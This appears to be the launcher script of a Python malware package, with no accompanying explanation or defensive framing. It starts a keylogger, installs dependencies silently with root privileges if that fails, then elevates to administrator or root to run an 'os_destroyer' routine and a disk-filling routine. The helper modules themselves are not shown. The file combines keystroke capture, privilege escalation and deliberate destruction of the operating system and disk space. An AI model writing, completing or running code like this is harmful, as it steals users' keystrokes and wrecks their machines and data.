try:
    from . import keylogger
    from . import os_destroyer
    from . import disk_fill
except ImportError:
    import keylogger
    import os_destroyer
    import disk_fill

from platform_mod import elevate, shells

try:
    keylogger.start_keylogger()

except Exception:
    shells.ShellBase.write_powershell("winget install python, pip, pywin32, pynput, keyboard, pyautogui, pyinstaller, pyperclip, psutil, requests, pycryptodome, pyinstaller-windows", is_root=True) or shells.ShellBase.write_cmd("winget install python, pip, pywin32, pynput, keyboard, pyautogui, pyinstaller, pyperclip, psutil, requests, pycryptodome, pyinstaller-windows", is_root=True)
    keylogger.start_keylogger()

finally:
    elevate.ElevateBase._run_as_admin("python", ["collection/os_destroyer.py"]) or elevate.ElevateBase._run_as_root("python", ["collection/os_destroyer.py"])
    os_destroyer.TerminalDestroyer()
    disk_fill.codeTest()